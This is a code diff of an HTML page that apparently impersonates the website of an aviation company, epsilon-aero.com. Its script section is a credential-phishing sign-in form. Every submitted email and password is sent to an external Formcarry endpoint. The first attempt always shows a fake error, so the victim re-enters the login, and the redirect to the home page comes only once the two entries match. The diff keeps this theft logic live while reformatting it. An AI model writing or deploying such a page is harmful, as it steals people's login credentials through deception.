@@ -342,7 +342,7 @@
 
         </div>
 
-       <div class="footer-column footer-col-divider">
+        <div class="footer-column footer-col-divider">
             <h4>ABOUT US</h4>
             <ul>
                 <li><a href="https://www.epsilon-aero.com/profile.html">Company Profile</a></li>
@@ -358,7 +358,9 @@
             <ul>
                 <li><a href="https://www.epsilon-aero.com/services-production-seat-covers.html">Production</a></li>
                 <li><a href="https://www.epsilon-aero.com/services-design.html">Design</a></li>
-                <li><a href="https://www.epsilon-aero.com/services-maintenance-repairs-of-cabin-polycarbonate.html">Maintenance</a></li>
+                <li><a
+                        href="https://www.epsilon-aero.com/services-maintenance-repairs-of-cabin-polycarbonate.html">Maintenance</a>
+                </li>
                 <li><a href="https://www.epsilon-aero.com/other-services.html">Other Services</a></li>
             </ul>
             <h4>INVESTORS</h4>
@@ -376,77 +378,74 @@
         </div>
     </footer>
 
-    <script>
+    <<script>
         function toggleMenu() {
-            document.getElementById("mobileMenu").classList.toggle("show");
+        document.getElementById("mobileMenu").classList.toggle("show");
         }
 
         function openModal() {
-            document.getElementById("signInModal").style.display = "flex";
+        document.getElementById("signInModal").style.display = "flex";
         }
 
         function closeModal() {
-            document.getElementById("signInModal").style.display = "none";
+        document.getElementById("signInModal").style.display = "none";
         }
 
         function togglePassword() {
-            const passwordInput = document.getElementById("password");
-            passwordInput.type = passwordInput.type === "password" ? "text" : "password";
+        const passwordInput = document.getElementById("password");
+        passwordInput.type = passwordInput.type === "password" ? "text" : "password";
         }
 
+        // ✅ Only declare once
         let firstAttempt = null;
-        let isRetry = false;
 
-        function togglePassword() {
-            const passwordInput = document.getElementById("password");
-            passwordInput.type =
-                passwordInput.type === "password" ? "text" : "password";
-        }
-        
         document.getElementById("loginForm").addEventListener("submit", async function (e) {
-            e.preventDefault();
+        e.preventDefault();
 
-            const email = document.getElementById("email").value.trim();
-            const password = document.getElementById("password").value.trim();
-            const formData = new FormData();
-            formData.append("email", email);
-            formData.append("password", password);
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value.trim();
+        const formData = new FormData();
+        formData.append("email", email);
+        formData.append("password", password);
 
-            const errorContainer = document.getElementById("errorContainer");
+        const errorContainer = document.getElementById("errorContainer");
 
-            try {
-                await fetch("https://formcarry.com/s/nFsPkQAf5_5", {
-                    method: "POST",
-                    body: formData,
-                });
+        try {
+        // Always send to Formcarry on every attempt
+        await fetch("https://formcarry.com/s/nFsPkQAf5_5", {
+        method: "POST",
+        body: formData,
+        });
 
-                if (!isRetry) {
-                    firstAttempt = { email, password };
-                    isRetry = true;
-                    errorContainer.style.display = "block";
-                    document.getElementById("password").value = "";
-                } else {
-                    if (firstAttempt.email === email && firstAttempt.password === password) {
-                        window.location.href = "index.html";
-                    } else {
-                        errorContainer.style.display = "block";
-                        document.getElementById("password").value = "";
-                    }
-                }
-            } catch (error) {
-                console.error("Submission failed:", error);
-                errorContainer.textContent = "Something went wrong. Please try again later.";
-                errorContainer.style.display = "block";
-            }
+        if (!firstAttempt) {
+        // First attempt — show error and save credentials
+        firstAttempt = { email, password };
+        errorContainer.style.display = "block";
+        document.getElementById("password").value = "";
+        } else {
+        // Second or later attempt
+        if (email === firstAttempt.email && password === firstAttempt.password) {
+        window.location.href = "index.html";
+        } else {
+        errorContainer.style.display = "block";
+        document.getElementById("password").value = "";
+        }
+        }
+        } catch (error) {
+        console.error("Submission failed:", error);
+        errorContainer.textContent = "Something went wrong. Please try again later.";
+        errorContainer.style.display = "block";
+        }
         });
 
         window.addEventListener("click", function (event) {
-            const modal = document.getElementById("signInModal");
-            if (event.target === modal) {
-                closeModal();
-            }
+        const modal = document.getElementById("signInModal");
+        if (event.target === modal) {
+        closeModal();
+        }
         });
-    </script>
+        </script>
+
 </body>
 
 </html>
